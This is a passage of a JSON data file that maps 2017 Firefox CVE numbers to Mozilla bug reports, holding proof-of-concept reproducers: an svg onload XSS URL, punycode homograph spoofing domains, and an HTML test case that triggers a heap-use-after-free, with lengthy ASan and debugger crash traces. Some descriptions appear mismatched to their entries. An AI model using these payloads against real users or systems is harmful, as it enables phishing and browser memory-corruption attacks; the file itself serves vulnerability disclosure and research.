represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==6893==ABORTING"
      }
    ],
    "CVE-2017-7823": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1396320",
        "title": "allow-same-origin capability always granted in CSP sandbox directive",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Steps to reproduce: 1. Go to https://test.shhnjk.com/allow-scripts.php?xss=%3Csvg%20onload=alert(document.domain)%3E 2. You will see alert with document.domain Actual results: alert with document.domain Expected results: Firefox should grant opaque origin to document when CSP sandbox doesn't have allow-same-origin flag. Currently, \"Content-Security-Policy: sandbox allow-scripts\" is enough to execute script with origin. https://www.w3.org/TR/CSP2/#directive-sandbox \"The sandbox directive allows any resource, framed or not, to ask for the same sorts of restrictions to be applied to itself.\""
      }
    ],
    "CVE-2017-7824": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1398381",
        "title": "Heap Buffer Overflow in CopyNativeVertexData (ANGLE)",
        "description": "User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36 Steps to reproduce: Run the uploaded file to see the heap buffer overflow on Stable editions on Windows Firefox x64/x86. Actual results: 1:061:x86> r eax=14500e4c ebx=0ecf4000 ecx=00000e4c edx=0002ff4c esi=14500000 edi=07122100 eip=6f83cf5e esp=008fd830 ebp=008fd848 iopl=0 nv up ei pl nz na pe cy cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00210207 VCRUNTIME140!memcpy+0x4e: 6f83cf5e f3a4 rep movs byte ptr es:[edi],byte ptr [esi] 1:061:x86> kb # ChildEBP RetAddr Args to Child 00 008fd834 658dfde2 070f3000 144d0f00 0002ff4c VCRUNTIME140!memcpy+0x4e [f:\\dd\\vctools\\crt\\vcruntime\\src\\string\\i386\\memcpy.asm @ 194] 01 008fd848 658d37b5 144d0f00 0000000c 00003ff1 libGLESv2!rx::CopyNativeVertexData<unsigned int,3,3,0>+0x19 [c:\\builds\\moz2_slave\\m-rel-w32-00000000000000000000\\build\\src\\gfx\\angle\\src\\libangle\\renderer\\d3d\\d3d11\\copyvertex.inl @ 17] 02 008fd878 658ad39c 008fd8ac 0000000c 00001406 libGLESv2!rx::VertexBuffer11::storeVertexAttributes+0xcb [c:\\builds\\moz2_slave\\m-rel-w32-00000000000000000000\\build\\src\\gfx\\angle\\src\\libangle\\renderer\\d3d\\d3d11\\vertexbuffer11.cpp @ 144] 03 008fd8c8 658adf48 008fd900 0ecf4000 00001406 libGLESv2!rx::StreamingVertexBufferInterface::storeDynamicAttribute+0xf0 [c:\\builds\\moz2_slave\\m-rel-w32-00000000000000000000\\build\\src\\gfx\\angle\\src\\libangle\\renderer\\d3d\\vertexbuffer.cpp @ 173] 04 008fd90c 658add39 008fd938 144d0f00 00000000 libGLESv2!rx::VertexDataManager::storeDynamicAttrib+0x10d [c:\\builds\\moz2_slave\\m-rel-w32-00000000000000000000\\build\\src\\gfx\\angle\\src\\libangle\\renderer\\d3d\\vertexdatamanager.cpp @ 480] 05 008fd970 658d354b 008fda14 0f068b68 008fd99c libGLESv2!rx::VertexDataManager::storeDynamicAttribs+0x13d [c:\\builds\\moz2_slave\\m-rel-w32-00000000000000000000\\build\\src\\gfx\\angle\\src\\libangle\\renderer\\d3d\\vertexdatamanager.cpp @ 400] 06 008fd9e0 658c2e1b 008fda14 14226b20 0f0452f8 libGLESv2!rx::VertexArray11::updateDirtyAndDynamicAttribs+0x2aa [c:\\builds\\moz2_slave\\m-rel-w32-00000000000000000000\\build\\src\\gfx\\angle\\src\\libangle\\renderer\\d3d\\d3d11\\vertexarray11.cpp @ 220] 07 008fda1c 658c7a88 008fda5c 0f0452f8 00000003 libGLESv2!rx::Renderer11::applyVertexBuffer+0x35 [c:\\builds\\moz2_slave\\m-rel-w32-00000000000000000000\\build\\src\\gfx\\angle\\src\\libangle\\renderer\\d3d\\d3d11\\renderer11.cpp @ 1698] 08 008fdaa4 658baca5 008fdaf0 0ccdfdd0 00000003 libGLESv2!rx::Renderer11::genericDrawElements+0x13b [c:\\builds\\moz2_slave\\m-rel-w32-00000000000000000000\\build\\src\\gfx\\angle\\src\\libangle\\renderer\\d3d\\d3d11\\renderer11.cpp @ 4514] 09 008fdacc 6587b2ad 008fdaf0 00000003 00000006 libGLESv2!rx::Context11::drawElements+0x20 [c:\\builds\\moz2_slave\\m-rel-w32-00000000000000000000\\build\\src\\gfx\\angle\\src\\libangle\\renderer\\d3d\\d3d11\\context11.cpp @ 168] 0a (Inline) -------- -------- -------- -------- libGLESv2!gl::Context::drawElements+0x23 [c:\\builds\\moz2_slave\\m-rel-w32-00000000000000000000\\build\\src\\gfx\\angle\\src\\libangle\\context.cpp @ 1631] 0b 008fdb08 5c24b5a7 00000003 00000006 00001403 libGLESv2!gl::DrawElements+0x5f [c:\\builds\\moz2_slave\\m-rel-w32-00000000000000000000\\build\\src\\gfx\\angle\\src\\libglesv2\\entry_points_gles_2_0.cpp @ 792] 0c (Inline) -------- -------- -------- -------- xul!mozilla::gl::GLContext::raw_fDrawElements+0x18 [c:\\builds\\moz2_slave\\m-rel-w32-00000000000000000000\\build\\src\\gfx\\gl\\glcontext.h @ 1147] 0d 008fdb20 5c6fdd62 00000003 00000006 00001403 xul!mozilla::gl::GLContext::fDrawElements+0x19 [c:\\builds\\moz2_slave\\m-rel-w32-00000000000000000000\\build\\src\\gfx\\gl\\glcontext.h @ 1161] 0e 008fdb70 5c5bda0c 00000003 00000006 00001403 xul!mozilla::WebGLContext::DrawElements+0xf9 [c:\\builds\\moz2_slave\\m-rel-w32-00000000000000000000\\build\\src\\dom\\canvas\\webglcontextdraw.cpp @ 819] 0f 008fdba8 5b5e858a 04530000 008fdc10 0ecf3400 xul!mozilla::dom::WebGLRenderingContextBinding::drawElements+0xa8 [c:\\builds\\moz2_slave\\m-rel-w32-00000000000000000000\\build\\src\\obj-firefox\\dom\\bindings\\webglrenderingcontextbinding.cpp @ 14403] 10 (Inline) -------- -------- -------- -------- xul!mozilla::dom::GenericBindingMethod+0xce [c:\\builds\\moz2_slave\\m-rel-w32-00000000000000000000\\build\\src\\dom\\bindings\\bindingutils.cpp @ 2812] 11 (Inline) -------- -------- -------- -------- xul!js::CallJSNative+0x383 [c:\\builds\\moz2_slave\\m-rel-w32-00000000000000000000\\build\\src\\js\\src\\jscntxtinlines.h @ 235] 12 008fdc44 5b5e8133 00000000 04530000 ffffff8c xul!js::InternalCallOrConstruct+0x40a [c:\\builds\\moz2_slave\\m-rel-w32-00000000000000000000\\build\\src\\js\\src\\vm\\interpreter.cpp @ 458] 13 008fdc68 5b6b26e3 1d7ff810 12237112 008fdd90 xul!InternalCall+0xa3 [c:\\builds\\moz2_slave\\m-rel-w32-00000000000000000000\\build\\src\\js\\src\\vm\\interpreter.cpp @ 503] 14 (Inline) -------- -------- -------- -------- xul!js::CallFromStack+0xb [c:\\builds\\moz2_slave\\m-rel-w32-00000000000000000000\\build\\src\\js\\src\\vm\\interpreter.cpp @ 509] 15 008fdd6c 160a129f 04530000 008fde28 1d7ff810 xul!js::jit::DoCallFallback+0x403 [c:\\builds\\moz2_slave\\m-rel-w32-00000000000000000000\\build\\src\\js\\src\\jit\\baselineic.cpp @ 6008] WARNING: Frame IP not in any known module. Following frames may be wrong. 16 008fddec 12237112 00005821 00000000 ffffff81 0x160a129f 17 008fde4c 160a0943 00001444 c450d882 00000000 0x12237112 18 00000000 00000000 00000000 00000000 00000000 0x160a0943"
      }
    ],
    "CVE-2017-7825": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1393624",
        "title": "Domain spoofing thanks to U+0620 ARABIC LETTER rendered as 'space' on Mac OS",
        "description": "After reporting issue 1390980 which is fixed in version 57.0a1 Nightly, we have found another character (https://www.compart.com/en/unicode/U+0620) looks like a 'space' on Mac OS http://important-domain.google.com.xn--fgbaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.bntk.pl/"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1390980",
        "title": "Domain spoofing thanks to U+0F8C rendered as 'space' on Mac OS 10.11",
        "description": "http://important-domain.google.xn--com-lumaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.xn--cfdaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.bntk.pl/"
      }
    ],
    "CVE-2017-7826": [
      {
        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1394530%2C1369561%2C1411458%2C1400003%2C1395138%2C1408412%2C1393840%2C1400763%2C1339259%2C1394265%2C1407740%2C1407751%2C1408005%2C1406398%2C1387799%2C1261175%2C1400554%2C1375146%2C1397811%2C1404636%2C1401804",
        "description": "http://important-domain.google.xn--com-lumaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.xn--cfdaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.bntk.pl/"
      }
    ],
    "CVE-2017-7827": [
      {
        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1399922%2C1403646%2C1403716%2C1365894%2C1402876%2C1406154%2C1384121%2C1384615%2C1407375%2C1339485%2C1361432%2C1394031%2C1383019%2C1407032%2C1387845%2C1386490",
        "description": "http://important-domain.google.xn--com-lumaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.xn--cfdaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.bntk.pl/"
      }
    ],
    "CVE-2017-7828": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1412252",
        "title": "heap-use-after-free in nsComputedDOMStyle::UpdateCurrentStyleSources",
        "description": "The following testcase crashes the latest ASAN build of Firefox (BuildID=20171026221048) crash.html: <script> function spin () { var x=new XMLHttpRequest(); x.open(\"POST\",\"https://mozilla.org\",false); x.send(\"X\"); } function start() { o1=window.open('x','p6','height=0'); o3=document.documentElement; o7=document.createElement('marquee'); o3.addEventListener('DOMAttrModified',fun0); o3.appendChild(o7); o1.getComputedStyle(o3).color; } function fun0() { spin(); } </script> <body onload=\"start()\"></body> ASAN output: ================================================================= ==10774==ERROR: AddressSanitizer: heap-use-after-free on address 0x62200003f110 at pc 0x7f067e63da87 bp 0x7fff53791690 sp 0x7fff53791688 READ of size 8 at 0x62200003f110 thread T0 (file:// Content) #0 0x7f067e63da86 in get /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:287:27 #1 0x7f067e63da86 in operator nsPresContext * /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:300 #2 0x7f067e63da86 in GetPresContext /builds/worker/workspace/build/src/obj-firefox/dist/include/nsIPresShell.h:254 #3 0x7f067e63da86 in nsComputedDOMStyle::UpdateCurrentStyleSources(bool) /builds/worker/workspace/build/src/layout/style/nsComputedDOMStyle.cpp:978 #4 0x7f067e63e161 in nsComputedDOMStyle::GetPropertyCSSValue(nsTSubstring<char16_t> const&, mozilla::ErrorResult&) /builds/worker/workspace/build/src/layout/style/nsComputedDOMStyle.cpp:1165:3 #5 0x7f067e63bd48 in nsComputedDOMStyle::GetPropertyValue(nsTSubstring<char16_t> const&, nsTSubstring<char16_t>&) /builds/worker/workspace/build/src/layout/style/nsComputedDOMStyle.cpp:479:26 #6 0x7f067e63bb58 in nsComputedDOMStyle::GetPropertyValue(nsCSSPropertyID, nsTSubstring<char16_t>&) /builds/worker/workspace/build/src/layout/style/nsComputedDOMStyle.cpp:415:10 #7 0x7f067aba3396 in GetColor /builds/worker/workspace/build/src/layout/style/nsCSSPropList.h:1439:1 #8 0x7f067aba3396 in mozilla::dom::CSS2PropertiesBinding::get_color(JSContext*, JS::Handle<JSObject*>, nsDOMCSSDeclaration*, JSJitGetterCallArgs) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/CSS2PropertiesBinding.cpp:12880 #9 0x7f067c34b156 in mozilla::dom::GenericBindingGetter(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2909:13 #10 0x7f06829577f0 in CallJSNative /builds/worker/workspace/build/src/js/src/jscntxtinlines.h:291:15 #11 0x7f06829577f0 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:473 #12 0x7f06829597c5 in InternalCall /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:522:12 #13 0x7f06829597c5 in Call /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:541 #14 0x7f06829597c5 in js::CallGetter(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:656 #15 0x7f06838ea68c in CallGetter /builds/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2119:16 #16 0x7f06838ea68c in GetExistingProperty<js::AllowGC::CanGC> /builds/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2172 #17 0x7f06838ea68c in NativeGetPropertyInline<js::AllowGC::CanGC> /builds/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2375 #18 0x7f06838ea68c in js::NativeGetProperty(JSContext*, JS::Handle<js::NativeObject*>, JS::Handle<JS::Value>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2411 #19 0x7f068339776c in GetProperty /builds/worker/workspace/build/src/js/src/vm/NativeObject.h:1601:12 #20 0x7f068339776c in JS_ForwardGetPropertyTo(JSContext*, JS::Handle<JSObject*>, JS::Handle<jsid>, JS::Handle<JS::Value>, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:2707 #21 0x7f067c34339f in mozilla::dom::GetPropertyOnPrototype(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::Handle<jsid>, bool*, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2096:10 #22 0x7f067aaeecb6 in mozilla::dom::CSS2PropertiesBinding::DOMProxyHandler::get(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>) const /builds/worker/workspace/build/src/obj-firefox/dom/bindings/CSS2PropertiesBinding.cpp:65860:8 #23 0x7f068361ec20 in getInternal /builds/worker/workspace/build/src/js/src/proxy/Proxy.cpp:353:21 #24 0x7f068361ec20 in js::Proxy::get(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/proxy/Proxy.cpp:363 #25 0x7f068296225b in GetProperty /builds/worker/workspace/build/src/js/src/vm/NativeObject.h:1600:16 #26 0x7f068296225b in GetProperty /builds/worker/workspace/build/src/js/src/jsobj.h:806 #27 0x7f068296225b in js::GetProperty(JSContext*, JS::Handle<JS::Value>, JS::Handle<js::PropertyName*>, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:4393 #28 0x7f0682944c98 in GetPropertyOperation /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:219:12 #29 0x7f0682944c98 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2786 #30 0x7f068292a14a in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:423:12 #31 0x7f06829578ef in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:495:15 #32 0x7f06829587e2 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:541:10 #33 0x7f068339d16b in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:3020:12 #34 0x7f067bd697e5 in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:260:37 #35 0x7f067c761e1d in Call<nsISupports *> /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:362:12 #36 0x7f067c761e1d in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) /builds/worker/workspace/build/src/dom/events/JSEventHandler.cpp:215 #37 0x7f067c72ab46 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1118:51 #38 0x7f067c72cd12 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1293:20 #39 0x7f067c70c3f1 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:462:16 #40 0x7f067c70f8c2 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:822:9 #41 0x7f067e9cf5ce in nsDocumentViewer::LoadComplete(nsresult) /builds/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1064:7 #42 0x7f06819eaafa in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, nsresult) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7759:21 #43 0x7f06819e6b24 in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7557:7 #44 0x7f06819ee37f in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7454:13 #45 0x7f0679638ba3 in nsDocLoader::DoFireOnStateChange(nsIWebProgress*, nsIRequest*, int&, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:1320:3 #46 0x7f0679637d0c in nsDocLoader::doStopDocumentLoad(nsIRequest*, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:861:14 #47 0x7f0679634d98 in nsDocLoader::DocLoaderIsEmpty(bool) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:750:9 #48 0x7f0679636cb2 in nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:632:5 #49 0x7f067963790c in non-virtual thunk to nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:488:14 #50 0x7f0677bc7c40 in mozilla::net::nsLoadGroup::RemoveRequest(nsIRequest*, nsISupports*, nsresult) /builds/worker/workspace/build/src/netwerk/base/nsLoadGroup.cpp:629:28 #51 0x7f067a7f8f9d in nsDocument::DoUnblockOnload() /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:9331:18 #52 0x7f067a7f8b61 in nsDocument::UnblockOnload(bool) /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:9253:9 #53 0x7f067a7d2c39 in nsDocument::DispatchContentLoadedEvents() /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:5645:3 #54 0x7f067a84bf72 in applyImpl<nsDocument, void (nsDocument::*)()> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1142:12 #55 0x7f067a84bf72 in apply<nsDocument, void (nsDocument::*)()> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1148 #56 0x7f067a84bf72 in mozilla::detail::RunnableMethodImpl<nsDocument*, void (nsDocument::*)(), true, (mozilla::RunnableKind)0>::Run() /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1192 #57 0x7f06779f0f01 in mozilla::SchedulerGroup::Runnable::Run() /builds/worker/workspace/build/src/xpcom/threads/SchedulerGroup.cpp:396:25 #58 0x7f0677a15f26 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1037:14 #59 0x7f0677a303e8 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:513:10 #60 0x7f0678802281 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:97:21 #61 0x7f06787627bb in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #62 0x7f06787627bb in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #63 0x7f06787627bb in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #64 0x7f067e176c7f in nsBaseAppShell::Run() /builds/worker/workspace/build/src/widget/nsBaseAppShell.cpp:158:27 #65 0x7f06826a8e97 in XRE_RunAppShell() /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:877:22 #66 0x7f06787627bb in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #67 0x7f06787627bb in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #68 0x7f06787627bb in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #69 0x7f06826a884a in XRE_InitChildProcess(int, char**, XREChildData const*) /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:703:34 #70 0x4ec2de in content_process_main /builds/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:63:30 #71 0x4ec2de in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:280 #72 0x7f069532582f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) #73 0x41dbc8 in _start (/fuzzer3/firefox/firefox+0x41dbc8) 0x62200003f110 is located 16 bytes inside of 5768-byte region [0x62200003f100,0x622000040788) freed by thread T0 (file:// Content) here: #0 0x4bc0fb in __interceptor_free /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:47:3 #1 0x7f067e8cd67e in mozilla::PresShell::Release() /builds/worker/workspace/build/src/layout/base/PresShell.cpp:841:1 #2 0x7f067e9d712b in assign_assuming_AddRef /builds/worker/workspace/build/src/obj-firefox/dist/include/nsCOMPtr.h:355:7 #3 0x7f067e9d712b in operator= /builds/worker/workspace/build/src/obj-firefox/dist/include/nsCOMPtr.h:631 #4 0x7f067e9d712b in nsDocumentViewer::DestroyPresShell() /builds/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:4645 #5 0x7f067e9c754c in nsDocumentViewer::Destroy() /builds/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1752:5 #6 0x7f067e9d8fae in nsDocumentViewer::Show() /builds/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:2089:17 #7 0x7f067ea69deb in nsPresContext::EnsureVisible() /builds/worker/workspace/build/src/layout/base/nsPresContext.cpp:2241:31 #8 0x7f067e8ef353 in mozilla::PresShell::UnsuppressAndInvalidate() /builds/worker/workspace/build/src/layout/base/PresShell.cpp:3892:54 #9 0x7f067e8da167 in UnsuppressPainting /builds/worker/workspace/build/src/layout/base/PresShell.cpp:3935:5 #10 0x7f067e8da167 in mozilla::PresShell::sPaintSuppressionCallback(nsITimer*, void*) /builds/worker/workspace/build/src/layout/base/PresShell.cpp:1861 #11 0x7f0677a35196 in nsTimerImpl::Fire(int) /builds/worker/workspace/build/src/xpcom/threads/nsTimerImpl.cpp:701:7 #12 0x7f0677a071f6 in nsTimerEvent::Run() /builds/worker/workspace/build/src/xpcom/threads/TimerThread.cpp:286:11 #13 0x7f06779f0f01 in mozilla::SchedulerGroup::Runnable::Run() /builds/worker/workspace/build/src/xpcom/threads/SchedulerGroup.cpp:396:25 #14 0x7f0677a15f26 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1037:14 #15 0x7f0677a303e8 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:513:10 #16 0x7f067dfb9f57 in SpinEventLoopUntil<mozilla::ProcessFailureBehavior::ReportToCaller, (lambda at /builds/worker/workspace/build/src/dom/xhr/XMLHttpRequestMainThread.cpp:3106:31)> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:323:25 #17 0x7f067dfb9f57 in mozilla::dom::XMLHttpRequestMainThread::SendInternal(mozilla::dom::BodyExtractorBase const*) /builds/worker/workspace/build/src/dom/xhr/XMLHttpRequestMainThread.cpp:3106 #18 0x7f067dfbb77c in mozilla::dom::XMLHttpRequestMainThread::Send(JSContext*, mozilla::dom::Nullable<mozilla::dom::DocumentOrBlobOrArrayBufferViewOrArrayBufferOrFormDataOrURLSearchParamsOrUSVString> const&, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/xhr/XMLHttpRequestMainThread.cpp:2935:11 #19 0x7f067bb89f7f in mozilla::dom::XMLHttpRequestBinding::send(JSContext*, JS::Handle<JSObject*>, mozilla::dom::XMLHttpRequest*, JSJitMethodCallArgs const&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/XMLHttpRequestBinding.cpp:1249:9 #20 0x7f067c34d570 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3040:13 #21 0x7f06829577f0 in CallJSNative /builds/worker/workspace/build/src/js/src/jscntxtinlines.h:291:15 #22 0x7f06829577f0 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:473 #23 0x7f0682942447 in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:528:12 #24 0x7f0682942447 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3067 #25 0x7f068292a14a in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:423:12 #26 0x7f06829578ef in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:495:15 #27 0x7f06829587e2 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:541:10 #28 0x7f068339d16b in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:3020:12 #29 0x7f067bd6c7c7 in mozilla::dom::EventListener::HandleEvent(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, mozilla::ErrorResult&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/EventListenerBinding.cpp:47:8 #30 0x7f067c72ab0c in HandleEvent<mozilla::dom::EventTarget *> /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventListenerBinding.h:65:12 #31 0x7f067c72ab0c in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1115 #32 0x7f067c72cd12 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1293:20 #33 0x7f067c70c6ba in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:486:14 #34 0x7f067c70f8c2 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:822:9 #35 